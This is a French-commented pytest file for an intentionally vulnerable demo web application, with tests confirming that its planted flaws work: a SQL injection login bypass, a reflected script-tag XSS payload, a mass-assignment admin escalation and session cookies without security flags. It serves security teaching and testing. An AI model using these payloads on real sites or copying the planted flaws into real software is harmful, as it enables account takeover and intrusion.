"""
Tests de demonstration - application vulnerable v1.0.
Ces tests doivent passer sur la v1.0 parce qu'ils prouvent que les failles
intentionnelles sont reellement exploitables.
"""

def test_sqli_login_bypass_succeeds(client):
    r = client.post('/login', data={
        'email': "' OR '1'='1' --",
        'password': 'x'
    }, follow_redirects=False)
    assert r.status_code == 302
    assert '/profile' in r.headers.get('Location', '')

def test_xss_search_reflected(client):
    r = client.get('/search?q=<script>alert(1)</script>')
    assert b'<script>alert(1)</script>' in r.data

def test_mass_assignment_allows_admin_escalation(client):
    r = client.post('/register', data={
        'email': 'attacker@test.com',
        'username': 'attacker',
        'password': 'Pass123!',
        'is_admin': 'true'
    }, follow_redirects=False)
    assert r.status_code == 302
    admin_page = client.get('/admin')
    assert admin_page.status_code == 200

def test_session_cookie_flags_missing(client):
    r = client.post('/login', data={
        'email': 'alice@vulnpyapp.local',
        'password': 'Alice123!'
    })
    set_cookie = '\n'.join(r.headers.getlist('Set-Cookie'))
    assert 'HttpOnly' not in set_cookie
    assert 'Secure' not in set_cookie
    assert 'SameSite' not in set_cookie
